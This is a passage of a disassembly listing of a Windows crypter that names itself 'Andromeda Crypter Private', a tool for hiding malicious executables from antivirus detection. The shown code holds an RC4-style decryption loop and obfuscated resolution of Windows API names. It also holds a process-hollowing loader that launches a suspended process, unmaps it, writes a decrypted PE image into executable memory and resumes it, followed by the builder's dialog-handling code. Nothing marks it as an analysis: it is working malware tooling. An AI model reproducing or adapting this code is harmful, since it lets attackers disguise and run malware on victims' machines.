; ---------------------------------------------------------------------------

loc_401918:				; CODE XREF: sub_4017BD+23Aj
		mov	ecx, [ebp+var_510]
		add	ecx, 1
		mov	[ebp+var_510], ecx

loc_401927:				; CODE XREF: sub_4017BD+159j
		mov	edx, [ebp+var_510]
		cmp	edx, [ebp+arg_8]
		jnb	loc_4019FC
		mov	eax, [ebp+var_4]
		add	eax, 1
		and	eax, 800000FFh
		jns	short loc_40194A
		dec	eax
		or	eax, 0FFFFFF00h
		inc	eax

loc_40194A:				; CODE XREF: sub_4017BD+184j
		mov	[ebp+var_4], eax
		mov	ecx, [ebp+var_4]
		mov	edx, [ebp+var_10C]
		add	edx, [ebp+ecx*4+var_50C]
		and	edx, 800000FFh
		jns	short loc_40196D
		dec	edx
		or	edx, 0FFFFFF00h
		inc	edx

loc_40196D:				; CODE XREF: sub_4017BD+1A6j
		mov	[ebp+var_10C], edx
		mov	eax, [ebp+var_4]
		mov	cl, byte ptr [ebp+eax*4+var_50C]
		mov	byte ptr [ebp+var_51C],	cl
		mov	edx, [ebp+var_4]
		mov	eax, [ebp+var_10C]
		mov	ecx, [ebp+eax*4+var_50C]
		mov	[ebp+edx*4+var_50C], ecx
		mov	edx, [ebp+var_51C]
		and	edx, 0FFh
		mov	eax, [ebp+var_10C]
		mov	[ebp+eax*4+var_50C], edx
		mov	ecx, [ebp+var_4]
		mov	edx, [ebp+ecx*4+var_50C]
		mov	eax, [ebp+var_10C]
		add	edx, [ebp+eax*4+var_50C]
		and	edx, 800000FFh
		jns	short loc_4019DA
		dec	edx
		or	edx, 0FFFFFF00h
		inc	edx

loc_4019DA:				; CODE XREF: sub_4017BD+213j
		mov	ecx, [ebp+arg_0]
		add	ecx, [ebp+var_510]
		mov	al, [ecx]
		xor	al, byte ptr [ebp+edx*4+var_50C]
		mov	ecx, [ebp+arg_0]
		add	ecx, [ebp+var_510]
		mov	[ecx], al
		jmp	loc_401918
; ---------------------------------------------------------------------------

loc_4019FC:				; CODE XREF: sub_4017BD+173j
		mov	eax, [ebp+arg_0]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_4017BD	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401A04	proc near		; CODE XREF: sub_40107Dj

var_468		= dword	ptr -468h
hResInfo	= dword	ptr -464h
Filename	= byte ptr -460h
var_35C		= dword	ptr -35Ch
var_358		= dword	ptr -358h
var_354		= byte ptr -354h
var_350		= byte ptr -350h
Dst		= dword	ptr -34Ch
var_308		= byte ptr -308h
var_304		= byte ptr -304h
var_300		= dword	ptr -300h
var_2FC		= byte ptr -2FCh
var_2F8		= byte ptr -2F8h
var_2F4		= byte ptr -2F4h
var_2F0		= byte ptr -2F0h
var_2EC		= byte ptr -2ECh
var_2E8		= dword	ptr -2E8h
var_2E4		= dword	ptr -2E4h
var_2D8		= dword	ptr -2D8h
var_228		= dword	ptr -228h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset unknown_libname_10 ; Microsoft VisualC 2-10/net runtime
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 45Ch
		mov	[ebp+var_358], 0
		jmp	short loc_401A3D
; ---------------------------------------------------------------------------

loc_401A2E:				; CODE XREF: sub_401A04+95j
		mov	eax, [ebp+var_358]
		add	eax, 1
		mov	[ebp+var_358], eax

loc_401A3D:				; CODE XREF: sub_401A04+28j
		cmp	[ebp+var_358], 0C350h
		jge	short loc_401A9B
		push	104h		; nSize
		lea	ecx, [ebp+Filename]
		push	ecx		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		push	6		; lpType
		push	37h		; lpName
		push	0		; hModule
		call	ds:FindResourceA
		mov	[ebp+hResInfo],	eax
		mov	edx, [ebp+hResInfo]
		push	edx		; hResInfo
		push	0		; hModule
		call	ds:SizeofResource
		mov	[ebp+var_35C], eax
		mov	eax, [ebp+hResInfo]
		push	eax		; hResInfo
		push	0		; hModule
		call	ds:LoadResource
		mov	[ebp+var_468], eax
		jmp	short loc_401A2E
; ---------------------------------------------------------------------------

loc_401A9B:				; CODE XREF: sub_401A04+43j
		push	44h		; Size
		push	0		; Val
		lea	ecx, [ebp+Dst]
		push	ecx		; Dst
		call	_memset
		add	esp, 0Ch
		mov	[ebp+Dst], 44h
		mov	[ebp+var_2D8], 10007h
		mov	edx, [ebp+arg_4]
		mov	dword_40ED40, edx
		mov	eax, dword_40ED40
		xor	ecx, ecx
		mov	cx, [eax]
		cmp	ecx, 5A4Dh
		jz	short loc_401AE2
		jmp	loc_401EE5
; ---------------------------------------------------------------------------

loc_401AE2:				; CODE XREF: sub_401A04+D7j
		mov	edx, dword_40ED40
		mov	eax, [ebp+arg_4]
		add	eax, [edx+3Ch]
		mov	dword_40ED48, eax
		mov	ecx, dword_40ED48
		cmp	dword ptr [ecx], 4550h
		jz	short loc_401B06
		jmp	loc_401EE5
; ---------------------------------------------------------------------------

loc_401B06:				; CODE XREF: sub_401A04+FBj
		push	9
		push	offset dword_40DD08
		call	sub_40100A
		add	esp, 8
		push	0Ch
		push	offset dword_40DD14
		call	sub_40100A
		add	esp, 8
		push	10h
		push	offset dword_40DD24
		call	sub_40100A
		add	esp, 8
		push	0Eh
		push	offset dword_40DD38
		call	sub_40100A
		add	esp, 8
		push	0Eh
		push	offset dword_40DD48
		call	sub_40100A
		add	esp, 8
		push	14h
		push	offset dword_40DD58
		call	sub_40100A
		add	esp, 8
		push	0Eh
		push	offset dword_40DD70
		call	sub_40100A
		add	esp, 8
		push	12h
		push	offset dword_40DD80
		call	sub_40100A
		add	esp, 8
		push	10h
		push	offset dword_40DD94
		call	sub_40100A
		add	esp, 8
		push	10h
		push	offset dword_40DDA8
		call	sub_40100A
		add	esp, 8
		push	0Ch
		push	offset dword_40DDBC
		call	sub_40100A
		add	esp, 8
		push	5
		push	offset aKernel32_dll_6 ; "kernel32.dll"
		push	offset dword_40DD24
		lea	ecx, [ebp+var_2EC]
		call	sub_401019
		mov	[ebp+var_4], 0
		push	5
		push	offset aKernel32_dll_7 ; "kernel32.dll"
		push	offset dword_40DD38
		lea	ecx, [ebp+var_2F4]
		call	sub_401032
		mov	byte ptr [ebp+var_4], 1
		push	5
		push	offset aKernel32_dll_8 ; "kernel32.dll"
		push	offset dword_40DD48
		lea	ecx, [ebp+var_308]
		call	sub_401087
		mov	byte ptr [ebp+var_4], 2
		push	5
		push	offset aNtdll_dll ; "ntdll.dll"
		push	offset dword_40DD58
		lea	ecx, [ebp+var_354]
		call	sub_401055
		mov	byte ptr [ebp+var_4], 3
		push	2
		push	offset aKernel32_dll_9 ; "kernel32.dll"
		push	offset dword_40DD70
		lea	ecx, [ebp+var_2F8]
		call	sub_401014
		mov	byte ptr [ebp+var_4], 4
		push	5
		push	offset aKernel32_dl_10 ; "kernel32.dll"
		push	offset dword_40DD80
		lea	ecx, [ebp+var_304]
		call	sub_401087
		mov	byte ptr [ebp+var_4], 5
		push	5
		push	offset aKernel32_dl_11 ; "kernel32.dll"
		push	offset dword_40DD94
		lea	ecx, [ebp+var_2F0]
		call	sub_401087
		mov	byte ptr [ebp+var_4], 6
		push	5
		push	offset aKernel32_dl_12 ; "kernel32.dll"
		push	offset dword_40DDA8
		lea	ecx, [ebp+var_2FC]
		call	sub_401087
		mov	byte ptr [ebp+var_4], 7
		push	5
		push	offset aKernel32_dl_13 ; "kernel32.dll"
		push	offset dword_40DDBC
		lea	ecx, [ebp+var_350]
		call	sub_40104B
		mov	byte ptr [ebp+var_4], 8
		lea	edx, [ebp+var_2E8]
		push	edx
		lea	eax, [ebp+Dst]
		push	eax
		push	0
		push	0
		push	4
		push	0
		push	0
		push	0
		mov	ecx, [ebp+arg_0]
		push	ecx
		push	0
		push	0Ah
		lea	edx, [ebp+var_308]
		push	edx
		call	sub_40105F
		add	esp, 30h
		mov	eax, dword_40ED48
		mov	ecx, [eax+34h]
		push	ecx
		mov	edx, [ebp+var_2E8]
		push	edx
		push	2
		lea	eax, [ebp+var_354]
		push	eax
		call	sub_40105A
		add	esp, 10h
		push	40h
		push	3000h
		mov	ecx, dword_40ED48
		mov	edx, [ecx+50h]
		push	edx
		mov	eax, dword_40ED48
		mov	ecx, [eax+34h]
		push	ecx
		mov	edx, [ebp+var_2E8]
		push	edx
		push	5
		lea	eax, [ebp+var_2F8]
		push	eax
		call	sub_401023
		add	esp, 1Ch
		push	0
		mov	ecx, dword_40ED48
		mov	edx, [ecx+54h]
		push	edx
		mov	eax, [ebp+arg_4]
		push	eax
		mov	ecx, dword_40ED48
		mov	edx, [ecx+34h]
		push	edx
		mov	eax, [ebp+var_2E8]
		push	eax
		push	5
		lea	ecx, [ebp+var_304]
		push	ecx
		call	sub_40105F
		add	esp, 1Ch
		mov	[ebp+var_300], 0
		jmp	short loc_401D72
; ---------------------------------------------------------------------------

loc_401D63:				; CODE XREF: sub_401A04+3E5j
		mov	edx, [ebp+var_300]
		add	edx, 1
		mov	[ebp+var_300], edx

loc_401D72:				; CODE XREF: sub_401A04+35Dj
		mov	eax, dword_40ED48
		xor	ecx, ecx
		mov	cx, [eax+6]
		cmp	[ebp+var_300], ecx
		jge	short loc_401DEE
		mov	edx, dword_40ED40
		mov	eax, [edx+3Ch]
		mov	ecx, [ebp+var_300]
		imul	ecx, 28h
		add	ecx, [ebp+arg_4]
		lea	edx, [ecx+eax+0F8h]
		mov	dword_40ED4C, edx
		push	0
		mov	eax, dword_40ED4C
		mov	ecx, [eax+10h]
		push	ecx
		mov	edx, dword_40ED4C
		mov	eax, [ebp+arg_4]
		add	eax, [edx+14h]
		push	eax
		mov	ecx, dword_40ED48
		mov	edx, [ecx+34h]
		mov	eax, dword_40ED4C
		add	edx, [eax+0Ch]
		push	edx
		mov	ecx, [ebp+var_2E8]
		push	ecx
		push	5
		lea	edx, [ebp+var_304]
		push	edx
		call	sub_40105F
		add	esp, 1Ch
		jmp	loc_401D63
; ---------------------------------------------------------------------------

loc_401DEE:				; CODE XREF: sub_401A04+37Fj
		lea	eax, [ebp+var_2D8]
		push	eax
		mov	ecx, [ebp+var_2E4]
		push	ecx
		push	2
		lea	edx, [ebp+var_2F0]
		push	edx
		call	sub_40105F
		add	esp, 10h
		mov	eax, dword_40ED48
		mov	ecx, [eax+34h]
		mov	edx, dword_40ED48
		add	ecx, [edx+28h]
		mov	[ebp+var_228], ecx
		lea	eax, [ebp+var_2D8]
		push	eax
		mov	ecx, [ebp+var_2E4]
		push	ecx
		push	2
		lea	edx, [ebp+var_2FC]
		push	edx
		call	sub_40105F
		add	esp, 10h
		mov	eax, [ebp+var_2E4]
		push	eax
		push	1
		lea	ecx, [ebp+var_350]
		push	ecx
		call	sub_40101E
		add	esp, 0Ch
		mov	byte ptr [ebp+var_4], 7
		lea	ecx, [ebp+var_350]
		call	sub_401037
		mov	byte ptr [ebp+var_4], 6
		lea	ecx, [ebp+var_2FC]
		call	sub_401073
		mov	byte ptr [ebp+var_4], 5
		lea	ecx, [ebp+var_2F0]
		call	sub_401073
		mov	byte ptr [ebp+var_4], 4
		lea	ecx, [ebp+var_304]
		call	sub_401073
		mov	byte ptr [ebp+var_4], 3
		lea	ecx, [ebp+var_2F8]
		call	sub_401005
		mov	byte ptr [ebp+var_4], 2
		lea	ecx, [ebp+var_354]
		call	sub_401082
		mov	byte ptr [ebp+var_4], 1
		lea	ecx, [ebp+var_308]
		call	sub_401073
		mov	byte ptr [ebp+var_4], 0
		lea	ecx, [ebp+var_2F4]
		call	sub_401028
		mov	[ebp+var_4], 0FFFFFFFFh
		lea	ecx, [ebp+var_2EC]
		call	sub_401046

loc_401EE5:				; CODE XREF: sub_401A04+D9j
					; sub_401A04+FDj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	esp, ebp
		pop	ebp
		retn
sub_401A04	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_401EF3(HWND hDlg, BOOL bEnable)
sub_401EF3	proc near		; CODE XREF: sub_401091j

hDlg		= dword	ptr  8
bEnable		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+bEnable]
		push	eax		; bEnable
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hDlg]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	edx, [ebp+bEnable]
		push	edx		; bEnable
		push	0		; nIDDlgItem
		mov	eax, [ebp+hDlg]
		push	eax		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	ecx, [ebp+bEnable]
		push	ecx		; bEnable
		push	0		; nIDDlgItem
		mov	edx, [ebp+hDlg]
		push	edx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	eax, [ebp+bEnable]
		push	eax		; bEnable
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hDlg]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	edx, [ebp+bEnable]
		push	edx		; bEnable
		push	0		; nIDDlgItem
		mov	eax, [ebp+hDlg]
		push	eax		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	ecx, [ebp+bEnable]
		push	ecx		; bEnable
		push	0		; nIDDlgItem
		mov	edx, [ebp+hDlg]
		push	edx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	eax, [ebp+bEnable]
		push	eax		; bEnable
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hDlg]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		mov	edx, [ebp+bEnable]
		push	edx		; bEnable
		push	0		; nIDDlgItem
		mov	eax, [ebp+hDlg]
		push	eax		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		pop	ebp
		retn
sub_401EF3	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
_WinMain@16_0	proc near		; CODE XREF: WinMain(x,x,x,x)j

var_154		= dword	ptr -154h
var_150		= dword	ptr -150h
var_14C		= dword	ptr -14Ch
var_148		= dword	ptr -148h
var_144		= dword	ptr -144h
var_140		= dword	ptr -140h
var_13C		= dword	ptr -13Ch
var_138		= byte ptr -138h
var_134		= dword	ptr -134h
var_130		= dword	ptr -130h
var_12C		= byte ptr -12Ch
var_128		= dword	ptr -128h
var_124		= dword	ptr -124h
var_120		= byte ptr -120h
var_11C		= byte ptr -11Ch
var_118		= byte ptr -118h
var_114		= byte ptr -114h
var_110		= dword	ptr -110h
var_10C		= byte ptr -10Ch
var_108		= byte ptr -108h
var_4		= dword	ptr -4
hInstance	= dword	ptr  8
hPrevInstance	= dword	ptr  0Ch
lpCmdLine	= dword	ptr  10h
nShowCmd	= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 154h
		push	0Eh
		push	offset dword_40DDFC
		call	sub_40100A
		add	esp, 8
		push	0Ch
		push	offset dword_40DE0C
		call	sub_40100A
		add	esp, 8
		push	0Dh
		push	offset dword_40DE1C
		call	sub_40100A
		add	esp, 8
		push	0Ch
		push	offset dword_40DE2C
		call	sub_40100A
		add	esp, 8
		push	0Ah
		push	offset dword_40DDDC
		call	sub_40100A
		add	esp, 8
		push	0Ch
		push	offset dword_40DDCC
		call	sub_40100A
		add	esp, 8
		push	12h
		push	offset dword_40DDE8
		call	sub_40100A
		add	esp, 8
		push	5
		push	offset aKernel32_dll ; "kernel32.dll"
		push	offset dword_40DDE8
		lea	ecx, [ebp+var_12C]
		call	sub_40104B
		push	2
		push	offset aKernel32_dll_0 ; "kernel32.dll"
		push	offset dword_40DDFC
		lea	ecx, [ebp+var_10C]
		call	sub_40104B
		push	2
		push	offset aKernel32_dll_1 ; "kernel32.dll"
		push	offset dword_40DE0C
		lea	ecx, [ebp+var_138]
		call	sub_401014
		push	2
		push	offset aKernel32_dll_2 ; "kernel32.dll"
		push	offset dword_40DE1C
		lea	ecx, [ebp+var_118]
		call	sub_40100F
		push	5
		push	offset aKernel32_dll_3 ; "kernel32.dll"
		push	offset dword_40DE2C
		lea	ecx, [ebp+var_120]
		call	sub_401014
		push	5
		push	offset aKernel32_dll_4 ; "kernel32.dll"
		push	offset dword_40DDDC
		lea	ecx, [ebp+var_114]
		call	sub_401014
		push	5
		push	offset aKernel32_dll_5 ; "kernel32.dll"
		push	offset dword_40DDCC
		lea	ecx, [ebp+var_11C]
		call	sub_401014
		push	104h
		lea	eax, [ebp+var_108]
		push	eax
		push	0
		push	3
		lea	ecx, [ebp+var_12C]
		push	ecx
		call	sub_40101E
		add	esp, 14h
		push	3
		push	5AADh
		push	0
		push	3
		lea	edx, [ebp+var_118]
		push	edx
		call	sub_401041
		add	esp, 14h
		mov	[ebp+var_110], eax
		cmp	[ebp+var_110], 0
		jnz	short loc_40216D
		mov	[ebp+var_13C], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_13C]
		jmp	loc_4024EB
; ---------------------------------------------------------------------------

loc_40216D:				; CODE XREF: _WinMain@16_0+159j
		mov	eax, [ebp+var_110]
		push	eax
		push	0
		push	2
		lea	ecx, [ebp+var_10C]
		push	ecx
		call	sub_40101E
		add	esp, 10h
		mov	[ebp+var_4], eax
		mov	edx, [ebp+var_110]
		push	edx
		push	0
		push	2
		lea	eax, [ebp+var_138]
		push	eax
		call	sub_401023
		add	esp, 10h
		mov	[ebp+var_128], eax
		cmp	[ebp+var_128], 0
		jnz	short loc_402215
		mov	[ebp+var_140], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_140]
		jmp	loc_4024EB
; ---------------------------------------------------------------------------

loc_402215:				; CODE XREF: _WinMain@16_0+201j
		mov	ecx, [ebp+var_128]
		push	ecx
		push	1
		lea	edx, [ebp+var_120]
		push	edx
		call	sub_401023
		add	esp, 0Ch
		mov	[ebp+var_124], eax
		cmp	[ebp+var_124], 0
		jnz	short loc_40229E
		mov	[ebp+var_144], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_144]
		jmp	loc_4024EB
; ---------------------------------------------------------------------------

loc_40229E:				; CODE XREF: _WinMain@16_0+28Aj
		push	3
		push	152Eh
		push	0
		push	3
		lea	eax, [ebp+var_118]
		push	eax
		call	sub_401041
		add	esp, 14h
		mov	[ebp+var_110], eax
		cmp	[ebp+var_110], 0
		jnz	short loc_402329
		mov	[ebp+var_148], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_148]
		jmp	loc_4024EB
; ---------------------------------------------------------------------------

loc_402329:				; CODE XREF: _WinMain@16_0+315j
		mov	ecx, [ebp+var_110]
		push	ecx
		push	0
		push	2
		lea	edx, [ebp+var_10C]
		push	edx
		call	sub_40101E
		add	esp, 10h
		mov	[ebp+var_130], eax
		mov	eax, [ebp+var_110]
		push	eax
		push	0
		push	2
		lea	ecx, [ebp+var_138]
		push	ecx
		call	sub_401023
		add	esp, 10h
		mov	[ebp+var_128], eax
		cmp	[ebp+var_128], 0
		jnz	short loc_4023D4
		mov	[ebp+var_14C], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_14C]
		jmp	loc_4024EB
; ---------------------------------------------------------------------------

loc_4023D4:				; CODE XREF: _WinMain@16_0+3C0j
		mov	edx, [ebp+var_128]
		push	edx
		push	1
		lea	eax, [ebp+var_120]
		push	eax
		call	sub_401023
		add	esp, 0Ch
		mov	[ebp+var_134], eax
		cmp	[ebp+var_134], 0
		jnz	short loc_40245D
		mov	[ebp+var_150], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_150]
		jmp	loc_4024EB
; ---------------------------------------------------------------------------

loc_40245D:				; CODE XREF: _WinMain@16_0+449j
		mov	ecx, [ebp+var_130]
		push	ecx
		mov	edx, [ebp+var_4]
		push	edx
		mov	eax, [ebp+var_134]
		push	eax
		mov	ecx, [ebp+var_124]
		push	ecx
		call	sub_40108C
		add	esp, 10h
		push	eax
		lea	edx, [ebp+var_108]
		push	edx
		call	sub_40107D
		add	esp, 8
		mov	[ebp+var_154], 0
		lea	ecx, [ebp+var_11C]
		call	sub_401005
		lea	ecx, [ebp+var_114]
		call	sub_401005
		lea	ecx, [ebp+var_120]
		call	sub_401005
		lea	ecx, [ebp+var_118]
		call	sub_401064
		lea	ecx, [ebp+var_138]
		call	sub_401005
		lea	ecx, [ebp+var_10C]
		call	sub_401037
		lea	ecx, [ebp+var_12C]
		call	sub_401037
		mov	eax, [ebp+var_154]

loc_4024EB:				; CODE XREF: _WinMain@16_0+1B8j
					; _WinMain@16_0+260j ...
		mov	esp, ebp
		pop	ebp
		retn	10h
_WinMain@16_0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_4024F1(HWND	hWnd, int, int,	int)
sub_4024F1	proc near		; CODE XREF: sub_40106Ej

var_154		= dword	ptr -154h
var_150		= dword	ptr -150h
Data		= byte ptr -48h
hObject		= dword	ptr -38h
NumberOfBytesWritten= dword ptr	-34h
var_30		= dword	ptr -30h
lpBuffer	= dword	ptr -28h
hUpdate		= dword	ptr -24h
nNumberOfBytesToWrite= dword ptr -1Ch
Point		= tagPOINT ptr -18h
Rect		= tagRECT ptr -10h
hWnd		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 154h
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_150], eax
		cmp	[ebp+var_150], 200h
		ja	short loc_40256B
		cmp	[ebp+var_150], 200h
		jz	loc_4026EC
		cmp	[ebp+var_150], 110h
		ja	short loc_402556
		cmp	[ebp+var_150], 110h
		jz	short loc_4025A0
		cmp	[ebp+var_150], 0Fh
		jz	loc_40266B
		cmp	[ebp+var_150], 10h
		jz	loc_40265A
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_402556:				; CODE XREF: sub_4024F1+38j
		cmp	[ebp+var_150], 111h
		jz	loc_4027F6
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_40256B:				; CODE XREF: sub_4024F1+1Cj
		cmp	[ebp+var_150], 201h
		jz	loc_40274F
		cmp	[ebp+var_150], 204h
		jz	loc_4027A6
		cmp	[ebp+var_150], 233h
		jz	loc_402690
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_4025A0:				; CODE XREF: sub_4024F1+44j
		push	0		; lpIconName
		mov	ecx, hInstance
		push	ecx		; hInstance
		call	ds:LoadIconA
		mov	lParam,	eax
		mov	edx, lParam
		push	edx		; lParam
		push	0		; wParam
		push	80h		; Msg
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		call	ds:SendMessageA
		push	1		; uCheck
		push	0		; nIDButton
		mov	ecx, [ebp+hWnd]
		push	ecx		; hDlg
		call	ds:CheckDlgButton
		push	0		; lParam
		push	1		; wParam
		push	0CFh		; Msg
		push	0		; nIDDlgItem
		mov	edx, [ebp+hWnd]
		push	edx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:SendMessageA
		push	0		; lpIconName
		mov	eax, hInstance
		push	eax		; hInstance
		call	ds:LoadIconA
		mov	lParam,	eax
		push	0		; lParam
		mov	ecx, lParam
		push	ecx		; wParam
		push	170h		; Msg
		push	0		; nIDDlgItem
		mov	edx, [ebp+hWnd]
		push	edx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:SendMessageA
		push	0		; bEnable
		push	0		; nIDDlgItem
		mov	eax, [ebp+hWnd]
		push	eax		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		push	3		; uFlags
		push	0		; cy
		push	0		; cx
		push	0		; Y
		push	0		; X
		push	0FFFFFFFFh	; hWndInsertAfter
		mov	ecx, [ebp+hWnd]
		push	ecx		; hWnd
		call	ds:SetWindowPos
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_40265A:				; CODE XREF: sub_4024F1+5Aj
		push	0		; nResult
		mov	edx, [ebp+hWnd]
		push	edx		; hDlg
		call	ds:EndDialog
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_40266B:				; CODE XREF: sub_4024F1+4Dj
		push	0		; lParam
		mov	eax, lParam
		push	eax		; wParam
		push	170h		; Msg
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hWnd]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:SendMessageA
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_402690:				; CODE XREF: sub_4024F1+A4j
		push	offset byte_40EC38
		call	sub_40103C
		add	esp, 4
		test	eax, eax
		jnz	short loc_4026C1
		push	10h		; uType
		push	offset Caption	; "Andromeda Crypter Private"
		push	offset Text	; "Could not load file!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_4026C1:				; CODE XREF: sub_4024F1+1AEj
		push	offset byte_40EC38 ; lpString
		push	0		; nIDDlgItem
		mov	eax, [ebp+hWnd]
		push	eax		; hDlg
		call	ds:SetDlgItemTextA
		push	1		; bEnable
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hWnd]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_4026EC:				; CODE XREF: sub_4024F1+28j
		lea	edx, [ebp+Point]
		push	edx		; lpPoint
		call	ds:GetCursorPos
		lea	eax, [ebp+Rect]
		push	eax		; lpRect
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hWnd]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:GetWindowRect
		mov	edx, [ebp+Point.y]
		push	edx
		mov	eax, [ebp+Point.x]
		push	eax		; pt
		lea	ecx, [ebp+Rect]
		push	ecx		; lprc
		call	ds:PtInRect
		test	eax, eax
		jz	short loc_402739
		push	7F89h		; lpCursorName
		push	0		; hInstance
		call	ds:LoadCursorA
		push	eax		; hCursor
		call	ds:SetCursor
		jmp	short loc_40274A
; ---------------------------------------------------------------------------

loc_402739:				; CODE XREF: sub_4024F1+230j
		push	0		; lpCursorName
		push	0		; hInstance
		call	ds:LoadCursorA
		push	eax		; hCursor
		call	ds:SetCursor

loc_40274A:				; CODE XREF: sub_4024F1+246j
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_40274F:				; CODE XREF: sub_4024F1+84j
		lea	edx, [ebp+Point]
		push	edx		; lpPoint
		call	ds:GetCursorPos
		lea	eax, [ebp+Rect]
		push	eax		; lpRect
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hWnd]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:GetWindowRect
		mov	edx, [ebp+Point.y]
		push	edx
		mov	eax, [ebp+Point.x]
		push	eax		; pt
		lea	ecx, [ebp+Rect]
		push	ecx		; lprc
		call	ds:PtInRect
		test	eax, eax
		jz	short loc_4027A1
		push	7F89h		; lpCursorName
		push	0		; hInstance
		call	ds:LoadCursorA
		push	eax		; hCursor
		call	ds:SetCursor
		mov	byte_40ED50, 0

loc_4027A1:				; CODE XREF: sub_4024F1+293j
		jmp	loc_402D27
; ---------------------------------------------------------------------------

